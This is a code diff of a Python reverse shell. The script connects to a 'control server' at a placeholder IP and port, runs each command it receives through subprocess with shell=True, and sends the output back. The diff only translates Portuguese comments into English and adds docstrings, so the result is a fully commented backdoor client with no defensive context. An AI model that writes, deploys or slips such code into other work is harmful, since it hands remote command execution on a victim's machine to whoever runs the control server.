@@ -2,15 +2,19 @@ import socket
 import subprocess
 import os
 
-# Configurações da conexão
-IP = "SERVER IP"  # IP do servidor de controle
-PORT = PORT             # Porta do servidor de controle
+# Connection settings
+IP = "SERVER IP"  # Control server IP address
+PORT = PORT       # Control server port
 
 def connect():
+    """
+    Establishes a connection to the control server and waits for commands.
+    """
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((IP, PORT))
     
     while True:
+        # Receive command from the server
         command = s.recv(1024).decode()
         
         if command.lower() == "exit":
@@ -18,22 +22,29 @@ def connect():
         
         if command[:2] == "cd":
             try:
+                # Change directory
                 os.chdir(command[3:])
                 s.send(b"Directory changed.\n")
             except Exception as e:
+                # Send error message if directory change fails
                 s.send(str(e).encode())
             continue
         
         try:
+            # Execute the command and capture the output
             output = subprocess.check_output(command, shell=True)
         except Exception as e:
+            # Capture error message if command execution fails
             output = str(e).encode()
         
+        # Handle case where there is no output from the command
         if not output:
             output = b"No output.\n"
         
+        # Send the output back to the server
         s.send(output)
     
+    # Close the connection
     s.close()
 
 if __name__ == "__main__":
